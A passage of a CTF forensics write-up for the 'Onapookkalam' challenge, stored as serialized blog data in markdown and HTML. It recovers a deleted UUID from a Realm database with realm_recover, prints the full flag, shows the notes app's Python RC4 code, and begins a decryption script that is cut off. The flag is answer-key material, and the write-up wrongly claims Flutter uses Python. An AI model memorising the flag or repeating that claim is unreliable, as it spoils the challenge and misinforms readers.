Objects not referenced by active tree roots\r\n   - These are **deleted/orphaned objects**\r\n   - Primary target for forensic recovery\r\n\r\n3. **data_storages.txt** (1.0 MB):\r\n   - Raw data storage analysis\r\n   - Binary dumps of storage regions\r\n\r\n4. **compare_objects.txt** (1.7 KB):\r\n   - Comparison of TreeRootOffset01 vs TreeRootOffset02\r\n   - Shows what changed between versions\r\n\r\n\r\n\r\n\r\n\r\nThe challenge description states the flag is in a \"string which was modified and then deleted from the realm db\". This means we need to search `scan_unused_objects.txt`.\r\n\r\nSearch for UUID-pattern strings (the typical format for test data in Realm databases):\r\n\r\n```bash\r\n$ grep -E \"[0-9A-F]{8}-[0-9A-Z]{4}-[0-9A-Z]{4}-[0-9A-Z]{4}-[0-9A-Z]{12}\" scan_unused_objects.txt\r\n```\r\n\r\nThis grep pattern searches for:\r\n- `[0-9A-F]{8}`: 8 hex digits\r\n- `-`: Literal hyphen\r\n- `[0-9A-Z]{4}`: 4 alphanumeric characters (allowing non-hex)\r\n- Pattern repeats: `8-4-4-4-12` (UUID format)\r\n\r\n**Result** (truncated for clarity):\r\n\r\n```\r\nOffset: 0x800000, Type: 0x11, Count: 534043, Object: [\r\n  ...\r\n  b'$97990266-4B4D-4306-A1EB-0FA8B4025844\\x06\\x04\\x02',\r\n  b'$48E1F6A5-C826-4244-B1CF-008E451606F3\\r\\x01\\x01\\x01',\r\n  ...\r\n  b'$5P0BF5BC-5AA1-4790-A05F-A2RDCBALDB49\\x06\\x04\\x02\\x03',\r\n  ...\r\n]\r\n```\r\n\r\n![Deleted Data](/images/posts/onapookkalam/onam-10.png)\r\n\r\n\r\n\r\n\r\nAmong hundreds of valid UUIDs, one stands out:\r\n\r\n```\r\n5P0BF5BC-5AA1-4790-A05F-A2RDCBALDB49\r\n```\r\n\r\n\r\nThis is **flagPart2**.\r\n\r\n\r\n\r\nThe `realm_recover` tool is able to successfully retrieve deleted data because of how Realm manages its internal storage and object lifecycle. Realm relies on a Multi-Version Concurrency Control (MVCC) model, which means older versions of objects are preserved for consistency and concurrency purposes instead of being immediately removed. As a result, when an object is deleted, its previous version can still remain in memory or on disk for some time.\r\n\r\nIn addition to this, `realm_recover` scans regions of the database file that are no longer actively allocated, allowing it to identify data that is not referenced by the current database state but has not yet been overwritten. Because the tool understands Realm's binary object layout, it can correctly parse these leftover structures and reconstruct meaningful records from raw bytes. In this case, the deleted UUID was found at offset `0x800000` within a region marked as unused. Although the object was no longer linked from the active database tree, its binary representation was still fully intact in the file, and the absence of garbage collection or overwrite made recovery possible.\r\n\r\n\r\n**Complete Flag:**\r\n```\r\nbi0sctf{w311_7h47_p4r7_w45_345y_5P0BF5BC-5AA1-4790-A05F-A2RDCBALDB49}\r\n```\r\n\r\n\r\n\r\n## References and Further Reading\r\n\r\n- [Blutter - Flutter Reverse Engineering Tool](https://github.com/worawit/blutter)\r\n- [realm_recover - Realm Database Forensics](https://github.com/hyuunnn/realm_recover)\r\n- [Realm Database Documentation](https://www.mongodb.com/docs/realm/)\r\n- [Flutter Forensics Research](https://arxiv.org/abs/2108.12419)\r\n- [Android Data Partition Structure](https://source.android.com/docs/core/storage)\r\n- [MVCC in Mobile Databases](https://dl.acm.org/doi/10.1145/3183713.3183754)\r\n- [Realm 데이터베이스의 삭제된 레코드 복구 기법](https://koreascience.or.kr/article/JAKO201820765436681.page)","src/content/blog/onapookkalam.md","bf6cac447b0e355d",{"html":547,"metadata":548},"\u003Ch1 id=\"onapookkalam-challenge-writeup\">Onapookkalam Challenge Writeup\u003C/h1>\n\u003Ch2 id=\"challenge-overview\">Challenge Overview\u003C/h2>\n\u003Cp>While preparing for Onapookkalam, notes were recorded on a mobile device. The phone was suspected to be tampered with, potentially having data modified or deleted.\u003C/p>\n\u003Cp>\u003Cstrong>Objectives:\u003C/strong>\u003C/p>\n\u003Cul>\n\u003Cli>\u003Cstrong>Note Retrieval\u003C/strong>: Extract specific information from saved notes (flagPart1)\u003C/li>\n\u003Cli>\u003Cstrong>Database Analysis\u003C/strong>: Identify a specific string that was modified and deleted from Realm DB (flagPart2)\u003C/li>\n\u003C/ul>\n\u003Cp>\u003Cstrong>Required Output Format\u003C/strong>: \u003Ccode>flag{flagPart1_flagPart2}\u003C/code>\u003C/p>\n\u003Chr>\n\u003Ch2 id=\"investigation-process\">Investigation Process\u003C/h2>\n\u003Ch3 id=\"initial-file-extraction\">Initial File Extraction\u003C/h3>\n\u003Cp>After extraction, numerous files were discovered:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-1.png\" alt=\"Extracted Files\">\u003C/p>\n\u003Ch3 id=\"notes-recovery\">Notes Recovery\u003C/h3>\n\u003Cp>The challenge focused on recovering notes. During the search for notes files, one file was found with a base64-encoded name:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-2.png\" alt=\"Base64 Named File\">\u003C/p>\n\u003Cp>This directory contained the following files:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-3.png\" alt=\"Directory Contents\">\u003C/p>\n\u003Ch3 id=\"flutter-app-analysis\">Flutter App Analysis\u003C/h3>\n\u003Cp>Further exploration revealed this was about recovering data from a Flutter app:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-4.png\" alt=\"Flutter App Evidence 1\">\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-5.png\" alt=\"Flutter App Evidence 2\">\u003C/p>\n\u003Ch3 id=\"source-code-discovery\">Source Code Discovery\u003C/h3>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-6.png\" alt=\"Source Code\">\u003C/p>\n\u003Cp>Since Flutter uses Python (via Flet framework), i  searched for Python files containing the APK logic. The main application file was found:\u003C/p>\n\u003Cp>\u003Cimg src=\"/images/posts/onapookkalam/onam-7.png\" alt=\"Python File Location\">\u003C/p>\n\u003Ch3 id=\"encryption-implementation\">Encryption Implementation\u003C/h3>\n\u003Cp>The discovered Python code revealed the notes app’s encryption scheme:\u003C/p>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> flet \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ft\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> datetime, random, os, string\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> key_scheduling\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(key):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    sched \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [i \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> range\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">256\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> j \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> range\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">256\u003C/span>\u003Cspan style=\"color:#E1E4E8\">):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (i \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[j] \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> key[j \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> len\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(key)]) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 256\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        tmp \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[j]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sched[j] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[i]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sched[i] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> stream_generation\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(sched):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    stream \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> []\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    j \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    while\u003C/span>\u003Cspan style=\"color:#79B8FF\"> True\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (\u003C/span>\u003Cspan style=\"color:#79B8FF\">1\u003C/span>\u003Cspan style=\"color:#F97583\"> +\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> i) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 256\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        j \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (sched[i] \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> j) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 256\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        tmp \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[j]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sched[j] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[i]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        sched[i] \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> tmp\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        yield\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[(sched[i] \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[j]) \u003C/span>\u003Cspan style=\"color:#F97583\">%\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 256\u003C/span>\u003Cspan style=\"color:#E1E4E8\">]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> encrypt\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(text, key):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    text \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">ord\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(char) \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> char \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> text]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    key \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [\u003C/span>\u003Cspan style=\"color:#79B8FF\">ord\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(char) \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> char \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> key]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    sched \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> key_scheduling(key)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    key_stream \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> stream_generation(sched)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    ciphertext \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> char \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> text:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        enc \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> str\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">hex\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(char \u003C/span>\u003Cspan style=\"color:#F97583\">^\u003C/span>\u003Cspan style=\"color:#79B8FF\"> next\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(key_stream))).lower()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        ciphertext \u003C/span>\u003Cspan style=\"color:#F97583\">+=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> enc\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    return\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ciphertext\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> storeData\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(page, content):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    app_data_path \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> os.getenv(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"FLET_APP_STORAGE_DATA\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    fileName \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#F97583\"> f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">{\u003C/span>\u003Cspan style=\"color:#E1E4E8\">datetime.datetime.now().strftime(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#79B8FF\">%d\u003C/span>\u003Cspan style=\"color:#9ECBFF\">%m%Y%H%M%S\u003C/span>\u003Cspan style=\"color:#79B8FF\">%f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003Cspan style=\"color:#79B8FF\">}\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    my_file_path \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> os.path.join(app_data_path, fileName)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    key \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">.join(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        random.choice(string.ascii_letters \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> string.digits) \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> _ \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> range\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">16\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    )\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    encText \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> encrypt(content, key)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    page.client_storage.set(fileName, key)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    with\u003C/span>\u003Cspan style=\"color:#79B8FF\"> open\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(my_file_path, \u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"w\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">) \u003C/span>\u003Cspan style=\"color:#F97583\">as\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> f:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        f.write(encText)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    page.open(ft.SnackBar(ft.Text(\u003C/span>\u003Cspan style=\"color:#F97583\">f\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"File saved to App Data Storage!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> main\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(page: ft.Page):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    def\u003C/span>\u003Cspan style=\"color:#B392F0\"> saveNote\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(e):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        data \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> inputBox.value\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        if\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> data \u003C/span>\u003Cspan style=\"color:#F97583\">!=\u003C/span>\u003Cspan style=\"color:#9ECBFF\"> \"\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            storeData(page, data)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">        else\u003C/span>\u003Cspan style=\"color:#E1E4E8\">:\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">            page.open(ft.SnackBar(ft.Text(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Empty content!\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    \u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    appBar \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ft.AppBar(\u003C/span>\u003Cspan style=\"color:#FFAB70\">title\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ft.Text(\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Notes App\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    inputBox \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> ft.TextField(\u003C/span>\u003Cspan style=\"color:#FFAB70\">hint_text\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Enter some text...\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">multiline\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\">True\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">min_lines\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\">3\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    page.appbar \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> appBar\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    page.add(inputBox)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    page.add(\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        ft.ElevatedButton(\u003C/span>\u003Cspan style=\"color:#FFAB70\">text\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#9ECBFF\">\"Save Note\"\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#FFAB70\">on_click\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\">saveNote, \u003C/span>\u003Cspan style=\"color:#FFAB70\">style\u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\">ft.ButtonStyle())\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    )\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">ft.app(main)\u003C/span>\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>The application allows users to create and save encrypted notes with the following workflow:\r\nWhen a user enters text and clicks “Save Note”, the application generates a unique filename based on the current timestamp (format: DDMMYYYYHHMMSSμs). It then creates a random 16-character encryption key consisting of letters and digits. The note content is encrypted using a custom implementation of the RC4 stream cipher algorithm, which involves two main phases: key scheduling (which initializes a 256-byte state array based on the encryption key) and stream generation (which produces a pseudo-random keystream). The encryption process XORs each character of the plaintext with the corresponding keystream byte and converts the result to hexadecimal format. The encrypted text is stored in a file within the app’s data directory, while the encryption key is separately stored in the client storage using the filename as the identifier. This design means that to decrypt any saved note, you need both the encrypted file and its corresponding encryption key from the client storage, making the encryption key essential for data recovery.\u003C/p>\n\u003Cp>so I wrote a Python script that:\u003C/p>\n\u003Col>\n\u003Cli>Implemented the RC4 decryption algorithm (mirroring the encryption code)\u003C/li>\n\u003Cli>Parsed the hex-encoded ciphertext\u003C/li>\n\u003Cli>XORed each byte with the keystream to recover plaintext\u003C/li>\n\u003C/ol>\n\u003Cpre class=\"astro-code github-dark\" style=\"background-color:#24292e;color:#e1e4e8; overflow-x: auto;\" tabindex=\"0\" data-language=\"python\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#6A737D\">#!/usr/bin/env python3\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#9ECBFF\">\"\"\"Simple decryption script for the notes challenge\"\"\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">import\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> os\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">def\u003C/span>\u003Cspan style=\"color:#B392F0\"> key_scheduling\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(key):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    sched \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> [i \u003C/span>\u003Cspan style=\"color:#F97583\">for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> i \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> range\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">256\u003C/span>\u003Cspan style=\"color:#E1E4E8\">)]\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">    i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#79B8FF\"> 0\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#F97583\">    for\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> j \u003C/span>\u003Cspan style=\"color:#F97583\">in\u003C/span>\u003Cspan style=\"color:#79B8FF\"> range\u003C/span>\u003Cspan style=\"color:#E1E4E8\">(\u003C/span>\u003Cspan style=\"color:#79B8FF\">0\u003C/span>\u003Cspan style=\"color:#E1E4E8\">, \u003C/span>\u003Cspan style=\"color:#79B8FF\">256\u003C/span>\u003Cspan style=\"color:#E1E4E8\">):\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#E1E4E8\">        i \u003C/span>\u003Cspan style=\"color:#F97583\">=\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> (i \u003C/span>\u003Cspan style=\"color:#F97583\">+\u003C/span>\u003Cspan style=\"color:#E1E4E8\"> sched[j] \u003C/span>\u003Cspan 